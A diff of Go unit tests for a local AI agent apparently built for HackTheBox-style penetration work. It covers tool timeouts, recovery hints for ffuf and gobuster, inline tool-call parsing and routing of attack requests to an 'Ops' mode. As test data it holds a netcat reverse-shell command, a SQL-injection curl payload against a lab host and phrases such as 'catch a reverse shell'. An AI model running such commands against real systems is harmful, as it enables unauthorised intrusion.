+		if sharedTerminalSupportsBackend(backend) {
+			t.Fatalf("%s should not use bash-only shared terminal wrapper", backend)
+		}
 	}
 }
 
@@ -1000,6 +1556,21 @@ func TestNormalizeToolCallArgumentsDecodesShellEntities(t *testing.T) {
 	}
 }
 
+func TestApplyWorkingContextBudgetTracksModelContext(t *testing.T) {
+	a := &App{history: agent.NewHistory(32768)}
+	// 64k model with a stale 32k mode preset: budget should follow the model
+	// (minus the response reserve), not be pinned at 32768.
+	applyWorkingContextBudget(a, 32768, 65536)
+	if got := a.history.Budget(); got != 65536-workingContextOutputReserve {
+		t.Fatalf("64k model budget = %d, want %d", got, 65536-workingContextOutputReserve)
+	}
+	// Smaller model: budget scales down with the real context.
+	applyWorkingContextBudget(a, 32768, 30000)
+	if got := a.history.Budget(); got != 30000-workingContextOutputReserve {
+		t.Fatalf("30k model budget = %d, want %d", got, 30000-workingContextOutputReserve)
+	}
+}
+
 func TestShouldUseSharedTerminal(t *testing.T) {
 	cfg := settings.DefaultSettings().Tools
 	cfg.ShellMode = "shared_terminal"
@@ -1015,20 +1586,53 @@ func TestShouldUseSharedTerminal(t *testing.T) {
 	}
 }
 
-func TestShellRequestsSession(t *testing.T) {
-	cases := []struct {
-		raw  string
-		want bool
-	}{
-		{`{"command":"nmap -sV 10.10.10.10"}`, false},
-		{`{"command":"id","session":false}`, false},
-		{`{"command":"nc -e /bin/bash 10.10.14.2 4444","session":true}`, true},
-		{`{"command":"cd /opt && ls"}`, false},
+func TestResolvedToolTimeoutUsesDefaultAndOverride(t *testing.T) {
+	cfg := settings.DefaultSettings().Tools
+	cfg.BashTimeout = 150
+	tc := llm.ToolCallDef{Function: llm.FunctionCall{Name: "shell", Arguments: json.RawMessage(`{"command":"id"}`)}}
+	if got := resolvedToolTimeout(cfg, tc); got != 150 {
+		t.Fatalf("default shell timeout = %d, want 150", got)
 	}
-	for _, c := range cases {
-		if got := shellRequestsSession(json.RawMessage(c.raw)); got != c.want {
-			t.Fatalf("shellRequestsSession(%s) = %v, want %v", c.raw, got, c.want)
-		}
+
+	tc.Function.Arguments = json.RawMessage(`{"command":"id","timeout":45}`)
+	if got := resolvedToolTimeout(cfg, tc); got != 45 {
+		t.Fatalf("explicit shell timeout = %d, want 45", got)
+	}
+
+	tc.Function.Name = "read_file"
+	if got := resolvedToolTimeout(cfg, tc); got != 0 {
+		t.Fatalf("non-shell timeout = %d, want 0", got)
+	}
+}
+
+func TestAppendShellRecoveryHintsForFFUFFuzzError(t *testing.T) {
+	result := "Keyword FUZZ defined, but not found in headers, method, URL or POST data."
+	got := appendShellRecoveryHints(result)
+	if !strings.Contains(got, "http://connected.htb/admin/FUZZ") {
+		t.Fatalf("ffuf recovery hint missing:\n%s", got)
+	}
+}
+
+func TestAppendShellRecoveryHintsForGobusterLengthFlag(t *testing.T) {
+	result := "Incorrect Usage: flag provided but not defined: -length\nNAME:\n   gobuster dir"
+	got := appendShellRecoveryHints(result)
+	if !strings.Contains(got, "--exclude-length") {
+		t.Fatalf("gobuster recovery hint missing:\n%s", got)
+	}
+}
+
+func TestRecoverBenignShellPipelineCloseForScannerHead(t *testing.T) {
+	tc := llm.ToolCallDef{Function: llm.FunctionCall{
+		Name:      "shell",
+		Arguments: json.RawMessage(`{"command":"ffuf -u https://connected.htb/FUZZ -w words.txt 2>&1 | head -30"}`),
+	}}
+	result := "ffuf hit\n[shared_terminal/wsl exit 141, 2s]"
+	got, ok := recoverBenignShellPipelineClose(tc, result, errors.New("exit code 141"))
+	if !ok {
+		t.Fatal("expected scanner | head exit 141 to be recovered")
+	}
+	if !strings.Contains(got, "SIGPIPE") || !strings.Contains(got, "Treat the shown output as evidence") {
+		t.Fatalf("missing pipeline-close recovery hint:\n%s", got)
 	}
 }
 
@@ -1446,12 +2050,42 @@ func TestParseInlineToolMarkupRepairsGemmaAngleCall(t *testing.T) {
 	}
 }
 
+func TestParseInlineToolMarkupRepairsGemmaBraceQuoteSentinels(t *testing.T) {
+	toolDefs := []llm.ToolDef{
+		{Function: llm.ToolFunctionDef{Name: "shell"}},
+	}
+	text := `<|channel>call:shell{command:<|"|>curl -X POST http://connected.htb/admin/ajax.php -d "action=getbrandmodel&id=1' AND 1=1--" -H "Content-Type: application/x-www-form-urlencoded"<|"|>}`
+
+	calls := parseInlineToolMarkup(text, toolDefs)
+	if len(calls) != 1 {
+		t.Fatalf("got %d calls, want 1: %#v", len(calls), calls)
+	}
+	args := string(calls[0].Function.Arguments)
+	if !strings.Contains(args, `curl -X POST http://connected.htb/admin/ajax.php`) || strings.Contains(args, `"command":"<"`) {
+		t.Fatalf("bad Gemma brace sentinel repair: %#v args=%s", calls[0], args)
+	}
+}
+
+func TestInvalidInlineShellCommandRejected(t *testing.T) {
+	call := llm.ToolCallDef{
+		Function: llm.FunctionCall{
+			Name:      "shell",
+			Arguments: json.RawMessage(`{"command":"<","|>curl -X POST http":"//connected.htb/admin/ajax.php"}`),
+		},
+	}
+	if !invalidInlineToolCall(call) {
+		t.Fatalf("malformed repaired shell command should be invalid")
+	}
+}
+
 func TestToolChoiceTreatsDirectoryQuestionAsTask(t *testing.T) {
 	if looksConversational("whats in this directory?") {
 		t.Fatalf("directory listing question should expose tools")
 	}
-	if got := toolChoiceFor("whats in this directory?", 0, 0); got != "auto" {
-		t.Fatalf("toolChoiceFor directory question = %q, want auto", got)
+	// "what's in this directory" is explicit inspection intent — force the listing
+	// tool call on the first turn rather than letting the model narrate.
+	if got := toolChoiceFor("whats in this directory?", 0, 0); got != "required" {
+		t.Fatalf("toolChoiceFor directory question = %q, want required", got)
 	}
 }
 
@@ -1504,18 +2138,36 @@ func TestVisibleTextBeforeInlineToolMarkupKeepsProgressSummary(t *testing.T) {
 
 func TestClassifyAgentMode(t *testing.T) {
 	tests := map[string]string{
-		"please review this code":        "Reviewer",
-		"latest news about local models": "Researcher",
-		"fix the failing build error":    "Fixer",
-		"plan the architecture":          "Planner",
-		"implement the settings page":    "Builder",
-		"make a plan and update files":   "Builder",
-		"hello there":                    "Auto",
+		"please review this code":                           "Reviewer",
+		"latest news about local models":                    "Researcher",
+		"fix the failing build error":                       "Fixer",
+		"plan the architecture":                             "Planner",
+		"implement the settings page":                       "Builder",
+		"make a plan and update files":                      "Builder",
+		"carry on hacking the HTB box":                      "Ops",
+		"carry on hacking the target and get user and root": "Ops",
+		"hello there":                                       "Auto",
 	}
 	for input, want := range tests {
 		if got := classifyAgentMode(input).Name; got != want {
 			t.Fatalf("classifyAgentMode(%q) = %q, want %q", input, got, want)
 		}
+	}
+}
+
+func TestClassifyAgentModeRoutesOperationalAttackWorkToOps(t *testing.T) {
+	for _, input := range []string{
+		"create a foothold payload for the target",
+		"verify RCE against 10.129.15.218",
+		"exploit FreePBX on connected.htb",
+		"start a listener and catch a reverse shell",
+	} {
+		if got := classifyAgentMode(input).Name; got != "Ops" {
+			t.Fatalf("classifyAgentMode(%q) = %q, want Ops", input, got)
+		}
+	}
+	if got := classifyAgentMode("research the latest CVE writeups").Name; got != "Researcher" {
+		t.Fatalf("pure web research should stay Researcher, got %q", got)
 	}
 }
 
@@ -1640,6 +2292,145 @@ func TestApplyAgentPresetOfflineDisablesExternalTools(t *testing.T) {
 	}
 }
 
+func TestApplyAgentPresetKeepsExplicitUnrestrictedToolset(t *testing.T) {
+	cfg := settings.DefaultSettings()
+	cfg.Tools.ActiveToolset = "unrestricted"
+	profiles := settings.DefaultProfiles()
+	profile := activeProfile(&cfg, &profiles)
+	autonomous := true
+
+	applyAgentPreset(&cfg, &profiles, AgentMode{Name: "Researcher"}, &profile, &autonomous)
+
+	if cfg.Tools.ActiveToolset != "unrestricted" {
+		t.Fatalf("explicit unrestricted toolset was downgraded to %q", cfg.Tools.ActiveToolset)
+	}
+	effective := settings.EffectiveEnabledTools(cfg.Tools)
+	if !effective["write_file"] || !effective["shell"] || !effective["web_search"] {
+		t.Fatalf("unrestricted should keep write/shell/web tools enabled: %#v", effective)
+	}
+}
+
+func TestToolDisabledMessageNamesActiveToolset(t *testing.T) {
+	cfg := settings.DefaultSettings().Tools
+	cfg.ActiveToolset = "web-research"
+
+	msg := toolDisabledMessage(cfg, "write_file")
+
+	if !strings.Contains(msg, "web-research") || !strings.Contains(msg, "Enabled tools now") || !strings.Contains(msg, "unrestricted") {
+		t.Fatalf("disabled message should explain toolset cause, got %q", msg)
+	}
+}
+
+func TestDisabledToolStopsOnlyAfterRepeat(t *testing.T) {
+	run := TaskRun{Tools: []TaskToolEvent{{Name: "shell", Status: "disabled"}}}
+	if shouldStopForDisabledTool(run, "shell") {
+		t.Fatal("first disabled tool call should be recoverable")
+	}
+	run.Tools = append(run.Tools, TaskToolEvent{Name: "shell", Status: "disabled"})
+	if !shouldStopForDisabledTool(run, "shell") {
+		t.Fatal("repeated disabled tool call should block")
+	}
+	run.Tools = append(run.Tools, TaskToolEvent{Name: "web_search", Status: "done"})
+	if shouldStopForDisabledTool(run, "shell") {
+		t.Fatal("non-disabled progress should reset the disabled repeat check")
+	}
+}
+
+func TestDisabledToolRecoveryPolicy(t *testing.T) {
+	cfg := settings.DefaultSettings().Tools
+	cfg.ActiveToolset = "web-research"
+	tc := llm.ToolCallDef{Function: llm.FunctionCall{Name: "write_file"}}
+
+	decision := evaluateDisabledToolRecoveryPolicy(TaskRun{}, cfg, tc)
+	if decision.HardStop || decision.RunState != "recovering" || decision.ToolStatus != "disabled" {
+		t.Fatalf("first disabled tool should recover, got %#v", decision)
+	}
+
+	run := TaskRun{Tools: []TaskToolEvent{
+		{Name: "write_file", Status: "disabled"},
+		{Name: "write_file", Status: "disabled"},
+	}}
+	decision = evaluateDisabledToolRecoveryPolicy(run, cfg, tc)
+	if !decision.HardStop || decision.StopReason != "tool_disabled" || decision.RunState != "blocked" {
+		t.Fatalf("repeated disabled tool should block, got %#v", decision)
+	}
+}
+
+func TestDuplicateFetchURLSkip(t *testing.T) {
+	run := TaskRun{Tools: []TaskToolEvent{
+		{Name: "fetch_url", Status: "done", Input: `{"url":"https://example.com/a/"}`, Result: "old"},
+	}}
+	tc := llm.ToolCallDef{Function: llm.FunctionCall{
+		Name:      "fetch_url",
+		Arguments: json.RawMessage(`{"url":"https://example.com/a"}`),
+	}}
+	got := duplicateFetchURLSkip(run, tc)
+	if !strings.Contains(got, "already fetched") || !strings.Contains(got, "different high-quality source") {
+		t.Fatalf("duplicate fetch was not skipped with useful guidance: %q", got)
+	}
+
+	decision := evaluateSkipRecoveryPolicy(run, tc)
+	if decision.ToolStatus != "skipped" || decision.RunState != "recovering" || !strings.Contains(decision.Message, "already fetched") {
+		t.Fatalf("duplicate fetch policy did not return skip decision: %#v", decision)
+	}
+}
+
+func TestPreToolRecoveryPolicyMapsRepeatedShellFailure(t *testing.T) {
+	run := TaskRun{Tools: []TaskToolEvent{
+		{Name: "shell", Status: "error", Input: `{"command":"curl http://target/admin"}`},
+		{Name: "shell", Status: "blocked", Input: `{"command":"curl http://target/admin"}`},
+	}}
+	tc := llm.ToolCallDef{Function: llm.FunctionCall{
+		Name:      "shell",
+		Arguments: json.RawMessage(`{"command":"curl http://target/admin"}`),
+	}}
+
+	decision := evaluatePreToolRecoveryPolicy(run, tc)
+	if decision.StopReason != "repeated_tool_failure" || !strings.Contains(decision.Message, "Repeated shell command blocked") {
+		t.Fatalf("unexpected policy decision: %#v", decision)
+	}
+}
+
+func TestPreToolRecoveryPolicySoftSkipsRepeatedSameResult(t *testing.T) {
+	input := `{"command":"sed -n '63,78p' /tmp/cve.py | cat -A"}`
+	run := TaskRun{Tools: []TaskToolEvent{
+		{Name: "shell", Status: "done", Input: input, Result: "same evidence\n[shared_terminal/wsl exit 0, 12ms]"},
+		{Name: "shell", Status: "done", Input: input, Result: "same evidence\n[shared_terminal/wsl exit 0, 10ms]"},
+	}}
+	tc := llm.ToolCallDef{Function: llm.FunctionCall{
+		Name:      "shell",
+		Arguments: json.RawMessage(input),
+	}}
+
+	decision := evaluatePreToolRecoveryPolicy(run, tc)
+	if decision.HardStop || decision.StopReason != "" || decision.ToolStatus != "skipped" || decision.RunState != "recovering" {
+		t.Fatalf("repeated same result should be a recoverable skip first: %#v", decision)
+	}
+	if !strings.Contains(decision.Message, "skipped without stopping") {
+		t.Fatalf("missing soft recovery wording: %q", decision.Message)
+	}
+}
+
+func TestPreToolRecoveryPolicyHardStopsIfSoftSkipIgnored(t *testing.T) {
+	input := `{"command":"sed -n '63,78p' /tmp/cve.py | cat -A"}`
+	skipResult := "Repeated shell command blocked after 2 identical successful results\nRecovery: this repeated command was skipped without stopping the run."
+	run := TaskRun{Tools: []TaskToolEvent{
+		{Name: "shell", Status: "done", Input: input, Result: "same evidence\n[shared_terminal/wsl exit 0, 12ms]"},
+		{Name: "shell", Status: "done", Input: input, Result: "same evidence\n[shared_terminal/wsl exit 0, 10ms]"},
+		{Name: "shell", Status: "skipped", Input: input, Result: skipResult},
+		{Name: "shell", Status: "skipped", Input: input, Result: skipResult},
+	}}
+	tc := llm.ToolCallDef{Function: llm.FunctionCall{
+		Name:      "shell",
+		Arguments: json.RawMessage(input),
+	}}
+
+	decision := evaluatePreToolRecoveryPolicy(run, tc)
+	if !decision.HardStop || decision.StopReason != "repeated_same_tool_result" || decision.ToolStatus != "blocked" {
+		t.Fatalf("ignored repeated-result recovery should hard stop: %#v", decision)
+	}
+}
+
 func TestAgentPresetContextBudgetDoesNotShrinkLoadContext(t *testing.T) {
 	cfg := settings.DefaultSettings()
 	cfg.Agents.ModeOverride = "Builder"
@@ -1726,6 +2517,43 @@ func TestBuildSystemPromptInjectsRelevantMemory(t *testing.T) {
 
 	if !strings.Contains(prompt, "Relevant project memory") || !strings.Contains(prompt, "LM Studio runs") || !strings.Contains(prompt, "tags=local") {
 		t.Fatalf("memory was not injected into prompt: %s", prompt)
+	}
+}
+
+func TestBuildSystemPromptSplitsMemoryPackets(t *testing.T) {
+	cfg := settings.DefaultSettings()
+	cfg.Context.MAULERMDPath = "C:/does/not/exist/MAULER.md"
+	prompt := buildSystemPrompt(cfg, AgentMode{Name: "Auto"}, []MemoryEntry{
+		{Title: "Style", Content: "Prefer WSL shell.", Kind: "preference", Confidence: "confirmed", Source: "user"},
+		{Title: "Target", Content: "HTTP service observed.", Kind: "fact", Confidence: "confirmed", Source: "tool"},
+		{Title: "Old run", Content: "Prior exploit may apply.", Kind: "note", Confidence: "confirmed", Source: "previous_run"},
+		{Title: "Guess", Content: "FreePBX path might be present.", Kind: "fact", Confidence: "hypothesis", Source: "model"},
+	}, nil)
+
+	wants := []string{
+		"Relevant project memory - user preferences and constraints",
+		"Relevant project memory - confirmed facts and decisions",
+		"Relevant project memory - previous run recall",
+		"Relevant project memory - unverified or stale",
+		"UNVERIFIED hypothesis: Guess",
+	}
+	for _, want := range wants {
+		if !strings.Contains(prompt, want) {
+			t.Fatalf("prompt missing %q:\n%s", want, prompt)
+		}
+	}
+}
+
+func TestBuildSystemPromptOpsTreatsMemoryAsHypothesis(t *testing.T) {
+	cfg := settings.DefaultSettings()
+	cfg.Context.MAULERMDPath = "C:/does/not/exist/MAULER.md"
+	cfg.Tools.ShellBackend = "wsl"
+	prompt := buildSystemPrompt(cfg, AgentMode{Name: "Ops"}, nil, nil)
+
+	for _, want := range []string{"Ops mode", "hypotheses", "live target evidence", "Do not choose an exploit only because a memory", "fresh current-source pass"} {
+		if !strings.Contains(prompt, want) {
+			t.Fatalf("Ops prompt missing %q: %s", want, prompt)
+		}
 	}
 }
 
